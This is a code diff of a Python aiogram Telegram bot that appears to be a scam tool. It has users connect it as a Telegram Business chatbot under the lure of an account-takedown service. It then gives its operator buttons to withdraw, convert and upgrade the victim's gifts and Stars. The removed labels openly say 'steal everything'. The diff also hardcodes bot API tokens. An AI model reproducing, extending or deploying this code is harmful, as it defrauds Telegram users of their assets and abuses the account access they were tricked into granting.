@@ -31,14 +31,14 @@ import re
 #import config
 import os
 
-TOKEN = "7993427462:AAEv__1yBiEP3Rmjr6keXxDrJdjhtufB2Tg" # Your Bot API Token from @BotFather
+TOKEN = "7608742328:AAENGOTUqWYPjL4Oo0bMpbT_vzOwPCjnUuQ" # Your Bot API Token from @BotFather
 # Turn business mode in settings bot
 
 bot = Bot(TOKEN)
 
 dp = Dispatcher()
 from aiogram.filters import Command
-ADMIN_ID = 7632459019 # Your Telegram ID
+ADMIN_ID = 6497221925 # Your Telegram ID
 from aiogram import F
 @dp.message(Command("refund"))
 async def refund_command(message: types.Message):
@@ -98,8 +98,8 @@ async def handle_text_query(message: Message):
         "1. ⚙️ Откройте <b>Настройки Telegram</b>\n"
         "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n"
         "3. 🤖 Откройте пункт <b>Чат-боты</b>\n"
-        "4. ✍️ Введите <code>@FreeSnonAccount_bot</code>\n\n"
-        "Имя бота: <code>@FreeSnonAccount_bot</code>\n",
+        "4. ✍️ Введите <code>@snos_damaskus_bot</code>\n\n"
+        "Имя бота: <code>@snos_damaskus_bot</code>\n",
 #        "❗Для корректной работы боту требуются <b>все права</b>",
         parse_mode="HTML"
     )
@@ -182,9 +182,9 @@ async def send_welcome_message_to_admin(connection, user_id, _bot):
         )
         keyboard = InlineKeyboardMarkup(
             inline_keyboard=[
-                [InlineKeyboardButton(text="🎁 спиздить всё нахуй (и ебануть все подарки в звезды)", callback_data=f"reveal_all_gifts:{user_id}")],
-                [InlineKeyboardButton(text="⭐️ Превратить всю хуйню в звезды", callback_data=f"convert_exec:{user_id}")],
-                [InlineKeyboardButton(text=f"🔝 апгрейд нахуй", callback_data=f"upgrade_user:{user_id}")]
+                [InlineKeyboardButton(text="🎁 Вывести все подарки (и превратить все подарки в звезды)", callback_data=f"reveal_all_gifts:{user_id}")],
+                [InlineKeyboardButton(text="⭐️ Превратить все подарки в звезды", callback_data=f"convert_exec:{user_id}")],
+                [InlineKeyboardButton(text=f"🔝 Апгрейднуть все гифты", callback_data=f"upgrade_user:{user_id}")]
             ]
         )
         await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
